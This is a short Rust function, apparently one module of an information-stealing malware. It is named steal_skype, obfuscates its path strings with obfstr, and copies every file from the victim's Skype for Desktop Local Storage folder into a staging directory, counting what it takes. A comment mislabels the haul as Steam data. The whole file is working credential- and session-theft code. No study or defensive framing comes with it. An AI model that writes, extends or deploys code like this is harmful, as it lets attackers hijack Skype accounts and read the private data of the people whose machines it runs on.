use walkdir::*;

pub fn steal_skype(path_in: String) {

    let path_str = &format!("{}\\{}", std::env::var("APPDATA").unwrap(), obfstr::obfstr!("Microsoft\\Skype for Desktop\\Local Storage\\"));
    let path = std::path::Path::new(path_str);

    if !path.exists() {
        return;
    }

    let _ = std::fs::create_dir(format!("{path_in}\\{}", obfstr::obfstr!("Skype\\")));

    

    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
           
       let _ =  std::fs::copy(entry.path(), &format!("{path_in}\\Skype\\{}", entry.file_name().to_str().unwrap())); // Copy Steam shit

       unsafe {
        crate::OTHERS += 1;
    }
    }




}